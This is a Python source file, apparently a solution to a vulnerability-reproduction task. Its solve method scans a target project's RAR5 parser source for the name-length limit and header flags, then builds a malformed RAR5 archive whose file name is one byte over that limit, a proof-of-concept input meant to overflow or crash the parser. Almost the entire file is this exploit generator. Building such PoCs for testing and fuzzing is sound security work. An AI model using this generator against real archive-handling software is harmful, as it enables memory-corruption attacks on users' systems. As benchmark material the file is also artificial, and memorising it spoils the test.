import os
import re
import tarfile
import binascii
from dataclasses import dataclass
from typing import Optional, Iterator, Tuple


def _encode_vint(n: int) -> bytes:
    if n < 0:
        raise ValueError("vint cannot be negative")
    out = bytearray()
    while True:
        b = n & 0x7F
        n >>= 7
        if n:
            out.append(b | 0x80)
        else:
            out.append(b)
            break
    return bytes(out)


def _decode_vint(data: bytes, off: int = 0) -> Tuple[int, int]:
    n = 0
    shift = 0
    while True:
        if off >= len(data):
            raise ValueError("truncated vint")
        b = data[off]
        off += 1
        n |= (b & 0x7F) << shift
        if (b & 0x80) == 0:
            return n, off
        shift += 7
        if shift > 63:
            raise ValueError("vint too large")


def _crc32(data: bytes) -> int:
    return binascii.crc32(data) & 0xFFFFFFFF


@dataclass
class _Rar5Params:
    size_includes_size_field: bool = False  # interpretation I2 if True, else I1
    max_name_size: int = 1024
    hfl_data_value: int = 2


class _Rar5Builder:
    def __init__(self, params: _Rar5Params):
        self.params = params

    def _block(self, body: bytes) -> bytes:
        if not self.params.size_includes_size_field:
            sz_bytes = _encode_vint(len(body))
            crc = _crc32(sz_bytes + body)
            return crc.to_bytes(4, "little") + sz_bytes + body

        # Size includes the size field bytes: S = len(body) + len(vint(S))
        body_len = len(body)
        s = body_len
        for _ in range(10):
            sz_bytes = _encode_vint(s)
            ns = body_len + len(sz_bytes)
            if ns == s:
                break
            s = ns
        sz_bytes = _encode_vint(s)
        crc = _crc32(sz_bytes + body)
        return crc.to_bytes(4, "little") + sz_bytes + body

    def main_header(self) -> bytes:
        body = _encode_vint(1) + _encode_vint(0) + _encode_vint(0)
        return self._block(body)

    def end_of_archive(self) -> bytes:
        body = _encode_vint(5) + _encode_vint(0) + _encode_vint(0)
        return self._block(body)

    def file_header_with_name(self, name_len: int, include_end: bool = True) -> bytes:
        # File header (type=2). We set block flags to include DATA so we can specify data_size=0.
        # Header fields (minimal):
        # HEAD_TYPE, HEAD_FLAGS, [DATA_SIZE], FILE_FLAGS, UNP_SIZE, ATTR, COMP_INFO, HOST_OS, NAME_LEN, NAME
        head_flags = self.params.hfl_data_value
        body = bytearray()
        body += _encode_vint(2)
        body += _encode_vint(head_flags)
        body += _encode_vint(0)          # data_size
        body += _encode_vint(0)          # file_flags
        body += _encode_vint(0)          # unpacked_size
        body += _encode_vint(0)          # attributes
        body += _encode_vint(0)          # comp_info
        body += _encode_vint(0)          # host_os
        body += _encode_vint(name_len)   # name_len
        body += b"A" * name_len          # name
        out = self._block(bytes(body))
        if include_end:
            out += self.end_of_archive()
        return out

    def build_poc(self, name_len: int) -> bytes:
        sig = b"Rar!\x1a\x07\x01\x00"
        return sig + self.main_header() + self.file_header_with_name(name_len, include_end=True)


class Solution:
    def _iter_source_files(self, src_path: str) -> Iterator[Tuple[str, bytes]]:
        if os.path.isdir(src_path):
            for root, _, files in os.walk(src_path):
                for fn in files:
                    p = os.path.join(root, fn)
                    try:
                        st = os.stat(p)
                    except OSError:
                        continue
                    if not os.path.isfile(p):
                        continue
                    if st.st_size > 8 * 1024 * 1024:
                        continue
                    try:
                        with open(p, "rb") as f:
                            yield p, f.read()
                    except OSError:
                        continue
            return

        try:
            with tarfile.open(src_path, "r:*") as tf:
                for m in tf.getmembers():
                    if not m.isreg():
                        continue
                    if m.size <= 0 or m.size > 8 * 1024 * 1024:
                        continue
                    name = m.name
                    try:
                        f = tf.extractfile(m)
                        if f is None:
                            continue
                        data = f.read()
                    except Exception:
                        continue
                    yield name, data
        except Exception:
            # Fallback: treat as file
            try:
                with open(src_path, "rb") as f:
                    yield src_path, f.read()
            except OSError:
                return

    def _infer_size_mode_from_sample(self, sample: bytes) -> Optional[bool]:
        sig = b"Rar!\x1a\x07\x01\x00"
        p = sample.find(sig)
        if p == -1:
            return None
        d = sample[p + len(sig):]
        if len(d) < 6:
            return None

        # Try parse first block CRC and decide which size interpretation yields matching CRC.
        stored_crc = int.from_bytes(d[0:4], "little")
        try:
            s1, o1 = _decode_vint(d, 4)
        except Exception:
            return None

        # I1: size excludes size field; body_len=s1
        ok_i1 = False
        if o1 + s1 <= len(d):
            sz_bytes = d[4:o1]
            body = d[o1:o1 + s1]
            crc = _crc32(sz_bytes + body)
            ok_i1 = (crc == stored_crc)

        # I2: size includes size field; total_len=s1 => body_len = s1 - len(sz_bytes)
        ok_i2 = False
        sz_bytes = d[4:o1]
        body_len = s1 - len(sz_bytes)
        if body_len >= 0 and o1 + body_len <= len(d):
            body = d[o1:o1 + body_len]
            crc = _crc32(sz_bytes + body)
            ok_i2 = (crc == stored_crc)

        if ok_i2 and not ok_i1:
            return True
        if ok_i1 and not ok_i2:
            return False
        if ok_i1 and ok_i2:
            # Prefer I1 as more common, unless I2 aligns better with plausible header types
            return False
        return None

    def _extract_params(self, src_path: str) -> _Rar5Params:
        params = _Rar5Params()

        # Find a rar5 sample to infer size mode
        sig = b"Rar!\x1a\x07\x01\x00"
        best_sample = None
        best_len = None

        # Extract max name size and HFL_DATA from source text, if available
        max_candidates = []
        hfl_data_candidates = []

        read_budget = 0
        for name, data in self._iter_source_files(src_path):
            if read_budget > 20 * 1024 * 1024:
                break
            read_budget += len(data)

            lname = name.lower()

            # sample scan: prioritize rar-related files
            if best_sample is None and (lname.endswith(".rar") or lname.endswith(".bin") or "rar" in lname):
                pos = data.find(sig)
                if pos != -1:
                    s = data[pos:]
                    if best_len is None or len(s) < best_len:
                        best_sample = s
                        best_len = len(s)

            # source scan
            if any(lname.endswith(ext) for ext in (".c", ".h", ".cc", ".cpp")) and ("rar5" in lname or "rar" in lname):
                try:
                    txt = data.decode("utf-8", "ignore")
                except Exception:
                    txt = ""

                # HFL_DATA
                for m in re.finditer(r'(?:#define\s+HFL_DATA\s+|HFL_DATA\s*=\s*)(0x[0-9a-fA-F]+|\d+)', txt):
                    v = m.group(1)
                    try:
                        hfl_data_candidates.append(int(v, 0))
                    except Exception:
                        pass

                # Max name size comparisons involving name_size
                # Collect small-ish numeric thresholds
                for m in re.finditer(r'\bname_size\b\s*(?:>|>=)\s*\(?\s*(0x[0-9a-fA-F]+|\d+)(?:\s*\*\s*(0x[0-9a-fA-F]+|\d+))?', txt):
                    a = m.group(1)
                    b = m.group(2)
                    try:
                        val = int(a, 0)
                        if b:
                            val *= int(b, 0)
                        if 16 <= val <= (1 << 22):
                            max_candidates.append(val)
                    except Exception:
                        pass

                # Alternative: NAME_MAX defines
                for m in re.finditer(r'#define\s+(?:RAR5_)?(?:MAX_)?NAME(?:_SIZE)?\s+(0x[0-9a-fA-F]+|\d+)', txt):
                    try:
                        val = int(m.group(1), 0)
                        if 16 <= val <= (1 << 22):
                            max_candidates.append(val)
                    except Exception:
                        pass

        if best_sample is not None:
            mode = self._infer_size_mode_from_sample(best_sample)
            if mode is not None:
                params.size_includes_size_field = mode

        if hfl_data_candidates:
            # Prefer small, power-of-two-ish value
            hfl_data_candidates.sort()
            params.hfl_data_value = hfl_data_candidates[0]

        if max_candidates:
            # Prefer the smallest plausible max name size
            max_candidates.sort()
            params.max_name_size = max_candidates[0]
        else:
            params.max_name_size = 1024

        # Ensure max reasonable
        if params.max_name_size < 16:
            params.max_name_size = 1024
        if params.max_name_size > (1 << 22):
            params.max_name_size = 1024

        return params

    def solve(self, src_path: str) -> bytes:
        params = self._extract_params(src_path)
        builder = _Rar5Builder(params)

        name_len = params.max_name_size + 1
        # Keep PoC reasonable in case max extraction is wrong
        if name_len < 33:
            name_len = 1025
        if name_len > (1 << 20) + 1:
            name_len = 1025

        return builder.build_poc(name_len)